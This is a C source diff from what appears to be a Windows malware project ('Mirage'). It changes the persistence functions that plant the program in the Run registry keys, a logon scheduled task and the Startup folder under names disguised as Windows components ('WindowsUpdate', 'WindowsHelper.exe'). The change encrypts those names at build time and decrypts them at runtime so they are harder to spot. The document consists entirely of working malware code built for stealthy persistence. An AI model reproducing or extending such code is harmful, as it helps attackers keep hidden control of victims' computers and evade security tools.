@@ -34,9 +34,12 @@
 #define REG_SZ 1
 #endif
 
-#define PERSIST_VAL_NAME     "MirageUpdate"
-#define PERSIST_STARTUP_FILE "WindowsHelper.exe"
-#define PERSIST_TASK_NAME    "WindowsUpdate"
+/* Encrypted at build time — decrypted at use via enc_decrypt() */
+#include "enc_strings.h"
+
+#define PERSIST_VAL_NAME_LEN  ENC_PERSIST_MIRAGE_UPDATE_LEN
+#define PERSIST_STARTUP_FILE_LEN ENC_PERSIST_WINDOWS_HELPER_LEN
+#define PERSIST_TASK_NAME_LEN ENC_PERSIST_WINDOWS_UPDATE_LEN
 
 #define HKLM ((HANDLE)(intptr_t)0x80000002)
 #define HKCU ((HANDLE)(intptr_t)0x80000001)
@@ -224,15 +227,18 @@ static int delete_registry_value(HKEY hkey, const char *subkey, const char *valu
 
 int persist_registry_install(const char *exe_path)
 {
+    char val_name[32];
+    enc_decrypt(enc_persist_mirage_update, ENC_PERSIST_MIRAGE_UPDATE_LEN, val_name);
+
     /* Try HKLM first, then HKCU */
     if (set_registry_string(HKLM,
             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-            PERSIST_VAL_NAME, exe_path))
+            val_name, exe_path))
         return 1;
 
     if (set_registry_string(HKCU,
             "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-            PERSIST_VAL_NAME, exe_path))
+            val_name, exe_path))
         return 1;
 
     return 0;
@@ -240,12 +246,15 @@ int persist_registry_install(const char *exe_path)
 
 int persist_registry_uninstall(void)
 {
+    char val_name[32];
+    enc_decrypt(enc_persist_mirage_update, ENC_PERSIST_MIRAGE_UPDATE_LEN, val_name);
+
     int lm = delete_registry_value(HKLM,
         "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-        PERSIST_VAL_NAME);
+        val_name);
     int cu = delete_registry_value(HKCU,
         "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-        PERSIST_VAL_NAME);
+        val_name);
     return lm || cu;
 }
 
@@ -290,12 +299,15 @@ int persist_registry_is_installed(void)
 int persist_scheduler_install(const char *exe_path)
 {
     /* Build: schtasks /create /tn "WindowsUpdate" /tr "<exe_path>" /sc onlogon /f */
+    char task_name[32];
+    enc_decrypt(enc_persist_windows_update, ENC_PERSIST_WINDOWS_UPDATE_LEN, task_name);
+
     char cmd[4096];
     int pos = 0;
 
     memcpy(cmd + pos, "schtasks /create /tn \"", 22); pos += 22;
-    size_t tname_len = strlen(PERSIST_TASK_NAME);
-    memcpy(cmd + pos, PERSIST_TASK_NAME, tname_len); pos += (int)tname_len;
+    size_t tname_len = strlen(task_name);
+    memcpy(cmd + pos, task_name, tname_len); pos += (int)tname_len;
     memcpy(cmd + pos, "\" /tr \"", 7); pos += 7;
     size_t exe_len = strlen(exe_path);
     if (pos + exe_len + 20 > 4096) return 0;
@@ -312,12 +324,15 @@ int persist_scheduler_install(const char *exe_path)
 int persist_scheduler_uninstall(void)
 {
     /* Build: schtasks /delete /tn "WindowsUpdate" /f */
+    char task_name[32];
+    enc_decrypt(enc_persist_windows_update, ENC_PERSIST_WINDOWS_UPDATE_LEN, task_name);
+
     char cmd[512];
     int pos = 0;
 
     memcpy(cmd + pos, "schtasks /delete /tn \"", 21); pos += 21;
-    size_t tname_len = strlen(PERSIST_TASK_NAME);
-    memcpy(cmd + pos, PERSIST_TASK_NAME, tname_len); pos += (int)tname_len;
+    size_t tname_len = strlen(task_name);
+    memcpy(cmd + pos, task_name, tname_len); pos += (int)tname_len;
     memcpy(cmd + pos, "\" /f", 4); pos += 4;
     cmd[pos] = 0;
 
@@ -355,7 +370,8 @@ int persist_startup_install(const char *exe_path)
     if (appdata_len == 0) return 0;
 
     static const char *startup_dir = "Microsoft\\Windows\\Start Menu\\Programs\\Startup";
-    static const char *startup_file = PERSIST_STARTUP_FILE;
+    char startup_file[32];
+    enc_decrypt(enc_persist_windows_helper, ENC_PERSIST_WINDOWS_HELPER_LEN, startup_file);
 
     /* Convert startup_dir and startup_file to wide */
     wchar_t dir_w[512], file_w[128];
@@ -393,7 +409,8 @@ int persist_startup_uninstall(void)
     if (appdata_len == 0) return 0;
 
     static const char *startup_dir = "Microsoft\\Windows\\Start Menu\\Programs\\Startup";
-    static const char *startup_file = PERSIST_STARTUP_FILE;
+    char startup_file[32];
+    enc_decrypt(enc_persist_windows_helper, ENC_PERSIST_WINDOWS_HELPER_LEN, startup_file);
 
     /* Convert appdata to ASCII for path assembly */
     char appdata_a[1024];
